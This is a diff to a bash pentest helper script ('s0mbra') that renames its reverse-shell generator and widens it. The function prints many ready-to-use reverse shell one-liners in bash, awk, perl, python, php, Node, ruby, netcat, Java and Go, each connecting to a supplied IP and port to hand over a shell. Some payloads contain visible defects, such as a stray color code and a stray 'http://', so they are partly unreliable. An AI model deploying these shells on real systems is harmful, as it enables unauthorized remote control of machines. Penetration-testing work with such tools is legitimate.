@@ -659,32 +659,48 @@ abe() {
 }
 
 # generates reverse shells in various languages for given IP:PORT
-generate_shells() {
+shells() {
     clear
     port=$2
 
     echo -e "$BLUE[s0mbra] OK, here are your shellz...\n$CLR"
 
-    echo -e "$YELLOW[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
-    echo -e "$YELLOW[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
-    echo -e "$YELLOW[bash]\033[0m rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
-    echo -e "$YELLOW[bash]\033[0m rm -f backpipe; mknod /tmp/backpipe p && nc $1 $port 0<backpipe | /bin/bash 1>backpipe"
-    echo -e "\033[1;34m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-    echo -e "\033[1;34m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
-    echo -e "\033[1;34m[perl (Windows)]\033[0m perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
-    echo -e "\033[1;36m[python]\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
-    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
-    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);shell_exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
-    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);system(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
-    echo -e "\033[1;32m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);popen(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
-    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-    echo -e "\033[1;30m[ruby]\033[0m ruby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-    echo -e "\033[36m[netcat]\033[0m nc -e /bin/sh $1 $port"
-    echo -e "\033[36m[netcat]\033[0m nc -c /bin/sh $1 $port"
-    echo -e "\033[36m[netcat]\033[0m /bin/sh | nc $1 $port"
-    echo -e "\033[36m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
-    echo -e "\033[36m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
+    echo -e "$YELLOW[bash]\033[0m\t\tbash -i >& /dev/tcp/$1/$port 0>&1"
+    echo -e "$YELLOW[bash]\033[0m\t\t0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
+    echo -e "$YELLOW[bash]\033[0m\t\trm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
+    echo -e "$YELLOW[bash]\033[0m\t\trm -f backpipe; mknod /tmp/backpipe p && nc $1 $port 0<backpipe | /bin/bash 1>backpipe"
+    echo
+    echo -e "\033[1;31m[gawk]\033[0m\t\tgawk 'BEGIN {P=$port;S=\"cmd> \";H=\"$1\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
+    echo -e "\033[1;31m[awk]\033[0m\t\tawk 'BEGIN {s = \"/inet/tcp/0/$1/$port\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+    echo
+    echo -e "\033[1;34m[perl]\033[0m\t\tperl -e 'use Socket;\$i=\"$1\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    echo -e "\033[1;34m[perl]\033[0m\t\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    echo -e "\033[1;34m[perl]\033[0m\t\tperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    echo
+    echo -e "\033[1;36m[python]\033[0m\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
+    echo
+    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);shell_exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);system(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[1;32m[php]\033[0m\t\tphp -r '\$sock=fsockopen(\"$1\",$port);popen(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo
+    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec('bash -i >& /dev/tcp/$1/$port 0>&1');\""
+    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec('nc -e /bin/sh $1 $port')\""
+    echo -e "\033[1;31m[Node]\033[0m\t\tnode -e \"require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/$1/$port 0>&1'\")\""
+    echo
+    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    echo -e "\033[1;33m[ruby]\033[0m\t\truby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    echo
+    echo -e "\033[36m[nc]\033[0m\t\tnc -e /bin/sh $1 $port"
+    echo -e "\033[36m[nc]\033[0m\t\tnc -c /bin/sh $1 $port"
+    echo -e "\033[36m[nc]\033[0m\t\t/bin/sh | nc $1 $port"
+    echo -e "\033[36m[nc]\033[0m\t\trm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
+    echo -e "\033[36m[nc]\033[0m\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
+    echo
+    echo -e "\033[1;35m[Java]\033[0m\t\tr = Runtime.getRuntime();p = r.exec([\"/bin/bash","-c","exec 5<>/dev/tcp/$1/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
+    echo
+    echo -e "\033[1;32m[Go]\033[0m\t\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$1:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go"
     echo -e "$BLUE\n[s0mbra] Done! $CLR"
 }
 
@@ -824,8 +840,8 @@ case "$cmd" in
     discloS3)
         discloS3 "$2"
     ;;
-    generate_shells)
-        generate_shells "$2" "$3"
+    shells)
+        shells "$2" "$3"
     ;;
     rubysast)
         ruby_sast "$2"
@@ -847,7 +863,7 @@ case "$cmd" in
 
         echo -e "$BLUE_BG:: PENTEST TOOLS ::\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$CLR"
         echo -e "$CYAN quick_nmap_scan $GRAY[IP] [*PORTS]\t$LIGHTGREEN(nmap)$CLR\t\t$CYAN full_nmap_scan $GRAY[IP] [*PORTS]\t$LIGHTGREEN(nmap)$CLR"
-        echo -e "$CYAN http $GRAY[PORT] [STACK]$CLR\t\t\t\t$CYAN generate_shells $GRAY[IP] [PORT] $CLR"
+        echo -e "$CYAN http $GRAY[PORT] [STACK]$CLR\t\t\t\t$CYAN shells $GRAY[IP] [PORT] $CLR"
         echo -e "$CYAN nfs_enum $GRAY[IP]$CLR\t\t\t\t\t$CYAN smb_enum $GRAY[IP] [USER] [PASSWORD]$CLR"
         echo -e "$CYAN smb_get_file $GRAY[IP] [PATH] [user] [*password] $CLR\t$CYAN smb_mount $GRAY[IP] [SHARE] [USER]$CLR"
         echo -e "$CYAN smb_umount $CLR"
